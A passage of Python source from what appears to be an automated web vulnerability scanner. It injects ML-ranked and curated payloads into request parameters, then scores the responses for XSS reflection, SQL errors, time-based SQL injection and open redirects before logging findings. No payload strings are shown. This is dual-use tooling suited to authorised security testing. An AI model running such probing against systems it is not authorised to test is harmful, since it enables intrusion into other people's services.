                    openredir_raw = bool(open_redirect_signal(loc_hdr, origin))
                    openredir = openredir_raw and _redirect_payload_influenced(
                        baseline_location, loc_hdr, payload, t["target_param"]
                    )
                    elapsed_ms_median = int(statistics.median(samples) * 1000)
                    time_sqli = _looks_time_based(payload) and time_delay_signal(baseline_ms, elapsed_ms_median)

                    # Hash / consistency
                    attempt_hash = _hash(body1_snip)
                    hash_changed = attempt_hash != baseline_hash
                    repeat_consistent = (len(samples) >= 2) and (statistics.pstdev(samples) * 1000.0 <= 200.0)

                    # Deltas vs baseline
                    status_delta = abs((status1 or 0) - s0)
                    len_delta = abs(len(body1_snip) - l0)
                    ms_delta = max(0, elapsed_ms_median - baseline_ms)

                    detector_hits = _make_detector_hits(
                        refl, sqlerr, openredir, time_sqli, boolean_sqli=False,
                        hash_changed=hash_changed, repeat_consistent=repeat_consistent,
                    )

                    # Heuristic confidence from signals/deltas
                    conf_heur = score(
                        {
                            "reflection": refl,
                            "sql_error": sqlerr,
                            "open_redirect": openredir,
                            "boolean_sqli": False,
                            "time_sqli": time_sqli,
                            "hash_changed": hash_changed,
                            "repeat_consistent": repeat_consistent,
                        },
                        status_delta, len_delta, ms_delta,
                    )

                    # Attempt-level ML (old path)
                    try:
                        ml_features = {
                            "detector_hits": detector_hits,
                            "status_delta": status_delta,
                            "len_delta": len_delta,
                            "latency_ms_delta": ms_delta,
                            "payload_family_used": fam or _payload_family(payload),
                            "response": {"headers": {"content-type": resp_headers.get("content-type", "")}},
                            "method": method,
                            "in": t["in"],
                        }
                        ml_out = _ranker_predict(ml_features)
                    except Exception:
                        ml_out = {"p": 0.0, "source": "fallback_error"}

                    ml_conf = float(ml_out.get("p", 0.0))
                    ml_src = str(ml_out.get("source", "fallback" if _ML_AVAILABLE else "none"))

                    # Clamp model confidence if we have neither detector signals nor deltas
                    if _is_negative_attempt(detector_hits, status_delta, len_delta, ms_delta):
                        ml_conf = 0.0

                    # Strong oracles dominate (floors)
                    if openredir:
                        ml_conf = max(ml_conf, 0.95)
                    if sqlerr:
                        ml_conf = max(ml_conf, 0.85)
                    if time_sqli:
                        ml_conf = max(ml_conf, 0.95)

                    # Stage A/B composite confidence
                    conf_stage_ab = max(0.0, min(1.0, 0.6 * family_prob + 0.4 * float(p_ml)))

                    # Final confidence
                    conf = max(conf_heur, ml_conf, conf_stage_ab)
                    inferred = _infer_class(detector_hits, status_delta, len_delta)

                    # Update recent-fail counts to inform the next ranking round
                    _bump_fail(recent_fail_counts, fam, detector_hits, status_delta, len_delta, ms_delta)

                    # Attempt (with provenance)
                    _append_evidence_line(
                        fout,
                        {
                            "type": "attempt",
                            "job": job_dir.name,
                            "target_id": t["id"],
                            "method": method,
                            "in": t["in"],
                            "param": t["target_param"],
                            "url": u1,
                            "headers": h1,
                            "body": b1,
                            "payload_string": payload,
                            "payload_family_used": fam or _payload_family(payload),
                            "payload_origin": "ml",
                            "ranker_meta": ranker_meta,
                            "detector_hits": detector_hits,
                            "inferred_vuln_class": inferred,
                            "ml": {"p": ml_conf, "source": ml_src, "enabled": _ML_AVAILABLE, "stage_ab_p": conf_stage_ab},
                            "signals": {
                                "reflection": refl,
                                "sql_error": sqlerr,
                                "open_redirect": {"location": loc_hdr, "external": openredir},
                            },
                            "status": status1,
                            "length": len(body1_full),
                            "elapsed_ms": elapsed_ms_median,
                            "timing_samples_ms": [int(s * 1000) for s in samples],
                            "status_delta": status_delta,
                            "len_delta": len_delta,
                            "latency_ms_delta": ms_delta,
                            "confidence": conf,
                            "response_hash": attempt_hash,
                            "response_snippet": body1_snip,
                        },
                    )

                    # Findings (threshold adjusted for JSON)
                    resp_ct = (resp_headers.get("content-type") or "").lower()
                    threshold_find = 0.5 if "application/json" in resp_ct else 0.6
                    should_record = (
                        conf >= threshold_find
                        or detector_hits.get("sql_error")
                        or detector_hits.get("xss_js")
                        or detector_hits.get("xss_raw")
                        or detector_hits.get("open_redirect")
                        or detector_hits.get("time_sqli")
                    )
                    if should_record:
                        ev_top = {
                            "job": job_dir.name,
                            "target_id": t["id"],
                            "method": method,
                            "in": t["in"],
                            "param": t["target_param"],
                            "url": t["url"],
                            "content_type": t.get("content_type"),
                            "payload_string": payload,
                            "payload_family_used": fam or _payload_family(payload),
                            "payload_origin": "ml",
                            "ranker_meta": ranker_meta,
                            "detector_hits": detector_hits,
                            "inferred_vuln_class": inferred,
                            "control_value": t["control_value"],
                            "status": status1,
                            "status_delta": status_delta,
                            "len_delta": len_delta,
                            "latency_ms_delta": ms_delta,
                            "ml": {"p": ml_conf, "source": ml_src, "enabled": _ML_AVAILABLE, "stage_ab_p": conf_stage_ab},
                            "confidence": conf,
                            "response_hash": _hash(body1_snip),
                            "response_snippet": body1_snip,
                        }

                        ev_norm = {
                            "request": {
                                "method": method,
                                "url": u1,
                                "param": t["target_param"],
                                "headers": h1,
                                "body": b1,
                            },
                            "response": {
                                "status": status1,
                                "length": len(body1_full),
                                "elapsed_ms": elapsed_ms_median,
                                "headers": {
                                    "content-type": resp_headers.get("content-type"),
                                    "location": resp_headers.get("location"),
                                    "set-cookie": resp_headers.get("set-cookie"),
                                },
                            },
                        }

                        ev = {**ev_top, **ev_norm, "type": "finding"}
                        _append_evidence_line(fout, ev)

                    seen_payloads.add(payload)

            # -------------------- GENERIC PAYLOAD LOOP (curated) --------------------
            payloads = _generate_context_aware_payloads(t)
            for payload in payloads:
                if payload in seen_payloads:
                    continue  # skip ones already used

                u1, h1, b1 = _apply_payload_to_target(t, payload, control=False)

                repeats = 3 if _looks_time_based(payload) else 1
                r1, err1, samples = _attempt_request(client, method, u1, h1, b1, timeout, repeats=repeats)

                if err1 is not None:
                    _append_evidence_line(
                        fout,
                        {
                            "type": "attempt_error",
                            "job": job_dir.name,
                            "target_id": t["id"],
                            "method": method,
                            "in": t["in"],
                            "param": t["target_param"],
                            "payload_string": payload,
                            "payload_family_used": _payload_family(payload),
                            "payload_origin": "curated",
                            "ranker_meta": None,
                            "url": u1,
                            "headers": h1,
                            "body": b1,
                            "error": err1,
                            "timing_samples_ms": [int(s * 1000) for s in samples],
                        },
                    )
                    continue

                # Bodies & headers
                body1_full, body1_snip, status1 = _response_core(r1)  # type: ignore[arg-type]
                resp_headers = _lower_headers(r1.headers)

                # Signals
                refl = reflection_signals(body1_full, payload)
                sqlerr = sql_error_signal(body1_full)
                loc_hdr = resp_headers.get("location")
                openredir_raw = bool(open_redirect_signal(loc_hdr, origin))
                openredir = openredir_raw and _redirect_payload_influenced(
                    baseline_location, loc_hdr, payload, t["target_param"]
                )
                elapsed_ms_median = int(statistics.median(samples) * 1000)
                time_sqli = _looks_time_based(payload) and time_delay_signal(baseline_ms, elapsed_ms_median)

                # Hash / consistency
                attempt_hash = _hash(body1_snip)
                hash_changed = attempt_hash != baseline_hash
                repeat_consistent = (len(samples) >= 2) and (statistics.pstdev(samples) * 1000.0 <= 200.0)

                # Deltas vs baseline
                status_delta = abs((status1 or 0) - s0)
                len_delta = abs(len(body1_snip) - l0)
                ms_delta = max(0, elapsed_ms_median - baseline_ms)

                detector_hits = _make_detector_hits(
                    refl, sqlerr, openredir, time_sqli, boolean_sqli=False,
                    hash_changed=hash_changed, repeat_consistent=repeat_consistent,
                )

                conf_heur = score(
                    {
                        "reflection": refl,
                        "sql_error": sqlerr,
                        "open_redirect": openredir,
                        "boolean_sqli": False,
                        "time_sqli": time_sqli,
                        "hash_changed": hash_changed,
                        "repeat_consistent": repeat_consistent,
                    },
                    status_delta, len_delta, ms_delta,
                )

                try:
                    ml_features = {
                        "detector_hits": detector_hits,
                        "status_delta": status_delta,
                        "len_delta": len_delta,
                        "latency_ms_delta": ms_delta,
                        "payload_family_used": _payload_family(payload),
                        "response": {"headers": {"content-type": resp_headers.get("content-type", "")}},
                        "method": method,
                        "in": t["in"],
                    }
                    ml_out = _ranker_predict(ml_features)
                except Exception:
                    ml_out = {"p": 0.0, "source": "fallback_error"}

                ml_conf = float(ml_out.get("p", 0.0))
                ml_src = str(ml_out.get("source", "fallback" if _ML_AVAILABLE else "none"))

                # Clamp model confidence if no signals and no deltas
                if _is_negative_attempt(detector_hits, status_delta, len_delta, ms_delta):
                    ml_conf = 0.0

                # Strong oracles dominate (floors)
                if openredir:
                    ml_conf = max(ml_conf, 0.95)
                if sqlerr:
                    ml_conf = max(ml_conf, 0.85)
                if time_sqli:
                    ml_conf = max(ml_conf, 0.95)

                # Update recent-fail counts (assign by inferred family for curated loop)
                fam_guess = _payload_family(payload)
                _bump_fail(recent_fail_counts, fam_guess, detector_hits, status_delta, len_delta, ms_delta)

                conf = max(conf_heur, ml_conf)
                inferred = _infer_class(detector_hits, status_delta, len_delta)

                _append_evidence_line(
                    fout,
                    {
                        "type": "attempt",
                        "job": job_dir.name,
                        "target_id": t["id"],
                        "method": method,
                        "in": t["in"],
                        "param": t["target_param"],
                        "url": u1,
                        "headers": h1,
                        "body": b1,
                        "payload_string": payload,
                        "payload_family_used": fam_guess,
                        "payload_origin": "curated",
                        "ranker_meta": None,
                        "detector_hits": detector_hits,
                        "inferred_vuln_class": inferred,
                        "ml": {"p": ml_conf, "source": ml_src, "enabled": _ML_AVAILABLE},
                        "signals": {
                            "reflection": refl,
                            "sql_error": sqlerr,
                            "open_redirect": {"location": loc_hdr, "external": openredir},
                        },
                        "status": status1,
                        "length": len(body1_full),
                        "elapsed_ms": elapsed_ms_median,
                        "timing_samples_ms": [int(s * 1000) for s in samples],
                        "status_delta": status_delta,
                        "len_delta": len_delta,
                        "latency_ms_delta": ms_delta,
                        "confidence": conf,
                        "response_hash": attempt_hash,
                        "response_snippet": body1_snip,
                    },
                )

                resp_ct = (resp_headers.get("content-type") or "").lower()
                threshold = 0.5 if "application/json" in resp_ct else 0.6
                should_record = (
                    conf >= threshold
                    or detector_hits.get("sql_error")
                    or detector_hits.get("xss_js")
                    or detector_hits.get("xss_raw")
                    or detector_hits.get("open_redirect")
                    or detector_hits.get("time_sqli")
                )
                if should_record:
                    ev_top = {
                        "job": job_dir.name,
                        "target_id": t["id"],
                        "method": method,
                        "in": t["in"],
                        "param": t["target_param"],
                        "url": t["url"],
                        "content_type": t.get("content_type"),
                        "payload_string": payload,
                        "payload_family_used": fam_guess,
                        "payload_origin": "curated",
                        "ranker_meta": None,
                        "detector_hits": detector_hits,
                        "inferred_vuln_class": inferred,
                        "control_value": t["control_value"],
                        "status": status1,
                        "status_delta": status_delta,
                        "len_delta": len_delta,
                        "latency_ms_delta": ms_delta,
                        "ml": {"p": ml_conf, "source": ml_src, "enabled": _ML_AVAILABLE},
                        "confidence": conf,
                        "response_hash": _hash(body1_snip),
                        "response_snippet": body1_snip,
                    }

                    ev_norm = {
                        "request": {
                            "method": method,
                            "url": u1,
                            "param": t["target_param"],
                            "headers": h1,
                            "body": b1,
                        },
                        "response": {
                            "status": status1,
                            "length": len(body1_full),
                            "elapsed_ms": elapsed_ms_median,
                            "headers": {
                                "content-type": resp_headers.get("content-type"),
                                "location": resp_headers.get("location"),
                                "set-cookie": resp_headers.get("set-cookie"),
                            },
                        },
                    }

                    ev = {**ev_top, **ev_norm, "type": "finding"}
                    _append_evidence_line(fout, ev)

    return evidence_path
